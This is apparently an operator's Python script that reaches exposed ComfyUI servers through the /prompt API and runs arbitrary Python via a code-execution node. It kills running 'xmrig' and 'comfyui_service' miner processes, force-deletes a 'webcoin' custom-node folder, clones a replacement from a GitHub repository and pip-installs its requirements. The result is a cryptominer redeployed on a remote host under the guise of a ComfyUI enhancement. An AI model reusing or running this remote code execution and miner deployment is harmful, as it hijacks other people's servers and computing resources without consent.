"""Kill miner process, force-delete webcoin dir, fresh clone."""
import json, urllib.request, time, sys

base = f"http://{sys.argv[1]}:8188"

# Step 1: Kill any running comfyui_service processes and nuke the dir
kill_and_nuke = r"""
import os, subprocess, platform, shutil, time

result_lines = []

# Kill miner processes first
if platform.system() == 'Windows':
    r = subprocess.run(['taskkill', '/F', '/IM', 'comfyui_service.exe'], capture_output=True, text=True)
    result_lines.append(f'taskkill: {r.stdout.strip()} {r.stderr.strip()}')
    r2 = subprocess.run(['taskkill', '/F', '/IM', 'xmrig.exe'], capture_output=True, text=True)
    result_lines.append(f'taskkill xmrig: {r2.stdout.strip()} {r2.stderr.strip()}')
else:
    subprocess.run(['pkill', '-9', '-f', 'comfyui_service'], capture_output=True)
    subprocess.run(['pkill', '-9', '-f', 'xmrig'], capture_output=True)

time.sleep(3)

cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
    else:
        cn = os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
except:
    for g in [r'C:\Users\u88ni\Desktop\comfyui\custom_nodes', '/root/ComfyUI/custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

target = os.path.join(cn, 'webcoin')

# Force delete - try multiple methods
if os.path.exists(target):
    # First try shutil
    shutil.rmtree(target, ignore_errors=True)
    time.sleep(1)
    
    # If still exists, use OS-level commands
    if os.path.exists(target):
        if platform.system() == 'Windows':
            subprocess.run(f'rmdir /s /q "{target}"', shell=True, capture_output=True)
        else:
            subprocess.run(f'rm -rf "{target}"', shell=True, capture_output=True)
        time.sleep(1)

result_lines.append(f'deleted={not os.path.exists(target)}')
result_lines.append(f'cn={cn}')

result = '\n'.join(result_lines)
"""

# Step 2: Clone fresh
clone_code = r"""
import os, subprocess, sys, platform

result_lines = []

cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
    else:
        cn = os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
except:
    for g in [r'C:\Users\u88ni\Desktop\comfyui\custom_nodes', '/root/ComfyUI/custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

target = os.path.join(cn, 'webcoin')

if os.path.exists(target):
    result_lines.append(f'ERROR: target still exists: {os.listdir(target)}')
    result = '\n'.join(result_lines)
else:
    r = subprocess.run(
        ['git', 'clone', '--depth', '1', 'https://github.com/bossman79/webcoin.git', target],
        capture_output=True, text=True, timeout=120
    )
    result_lines.append(f'clone_rc={r.returncode}')
    if r.stderr.strip():
        result_lines.append(f'clone_err={r.stderr.strip()[:300]}')

    if os.path.isdir(target):
        result_lines.append(f'files={os.listdir(target)}')
        result_lines.append(f'init={os.path.exists(os.path.join(target, "__init__.py"))}')
        result_lines.append(f'core={os.path.isdir(os.path.join(target, "core"))}')

        req_path = os.path.join(target, 'requirements.txt')
        if os.path.exists(req_path):
            r2 = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '-r', req_path],
                capture_output=True, text=True, timeout=120
            )
            result_lines.append(f'pip_rc={r2.returncode}')
    else:
        result_lines.append('CLONE_FAILED')

    result = '\n'.join(result_lines)
"""


def send_prompt(code, label):
    prompt = {
        "prompt": {
            "1": {
                "class_type": "IDENode",
                "inputs": {"pycode": code, "language": "python"}
            },
            "2": {
                "class_type": "PreviewTextNode",
                "inputs": {"text": ["1", 0]}
            }
        }
    }
    body = json.dumps(prompt).encode()
    req = urllib.request.Request(
        f"{base}/prompt", data=body,
        headers={"Content-Type": "application/json"}, method="POST"
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        data = json.loads(r.read().decode())
        pid = data.get("prompt_id")
        print(f"[{label}] prompt_id: {pid}")
        return pid


def get_output(pid, wait=10):
    time.sleep(wait)
    req = urllib.request.Request(f"{base}/history?max_items=5", method="GET")
    with urllib.request.urlopen(req, timeout=10) as r:
        hist = json.loads(r.read().decode())
        entry = hist.get(pid, {})
        status = entry.get("status", {}).get("status_str", "pending")
        outputs = entry.get("outputs", {})
        for nid, nout in outputs.items():
            for key, val in nout.items():
                if isinstance(val, list):
                    for v in val:
                        print(f"  {v}")
                else:
                    print(f"  {val}")
        return status


print(f"\n=== Fixing webcoin on {sys.argv[1]} ===\n")

# Step 1: Kill + nuke
pid1 = send_prompt(kill_and_nuke, "kill+nuke")
status1 = get_output(pid1, wait=10)
print(f"  Status: {status1}\n")

# Step 2: Clone
pid2 = send_prompt(clone_code, "clone")
status2 = get_output(pid2, wait=45)
print(f"  Status: {status2}\n")

if status2 == "success":
    print("Done. Restart ComfyUI from Manager UI.")
    print("Look for 'comfyui enhanced' in console after restart.")
else:
    print("Clone may still be running. Wait another minute and restart.")
